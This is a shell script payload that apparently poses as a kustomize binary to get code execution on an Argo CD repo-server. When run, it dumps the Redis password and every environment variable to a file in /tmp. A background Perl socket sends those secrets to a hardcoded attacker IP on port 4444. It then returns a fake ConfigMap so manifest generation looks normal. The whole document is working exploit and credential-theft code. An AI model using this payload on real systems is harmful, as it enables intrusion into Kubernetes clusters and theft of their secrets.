#!/bin/sh

ATTACKER_HOST="10.244.103.143"
ATTACKER_PORT="4444"

# 1) Filesystem proof on the repo-server pod (survives even with no egress).
#    Verify with: kubectl -n argocd exec <repo-server-pod> -- cat /tmp/argocd_pwned.txt
{
  echo "=== argocd repo-server pwned ==="
  echo "date: $(date)"
  echo "whoami: $(id)"
  echo "host: $(hostname)"
  echo "REDIS_PASSWORD=${REDIS_PASSWORD}"
  echo "REDIS_SERVER=${REDIS_SERVER}"
  env
} > /tmp/argocd_pwned.txt 2>&1

# 2) Background Perl exfil, hard-capped so it can never stall kustomize.
ATTACKER_HOST="$ATTACKER_HOST" ATTACKER_PORT="$ATTACKER_PORT" perl -e '
    use IO::Socket::INET;
    my $s = IO::Socket::INET->new(
        PeerAddr => $ENV{"ATTACKER_HOST"},
        PeerPort => $ENV{"ATTACKER_PORT"},
        Proto    => "tcp",
        Timeout  => 5,
    ) or exit 0;
    print $s "=== argocd repo-server pwned ===\n";
    print $s "whoami: ", scalar(getpwuid($<)), " uid=$<\n";
    print $s "host: ", `hostname`;
    print $s "REDIS_PASSWORD=", ($ENV{"REDIS_PASSWORD"} // ""), "\n";
    print $s "REDIS_SERVER=",   ($ENV{"REDIS_SERVER"}   // ""), "\n";
    print $s "--- env ---\n";
    print $s "$_=$ENV{$_}\n" for sort keys %ENV;
    close($s);
' >/dev/null 2>&1 &

# 3) Answer kustomize right away so GenerateManifest returns cleanly.
case "$*" in
  *template*)
    printf 'apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: pwned\n  namespace: default\ndata:\n  rce: "true"\n'
    ;;
  *version*)
    echo 'v3.99.0'
    ;;
  *)
    exit 0
    ;;
esac
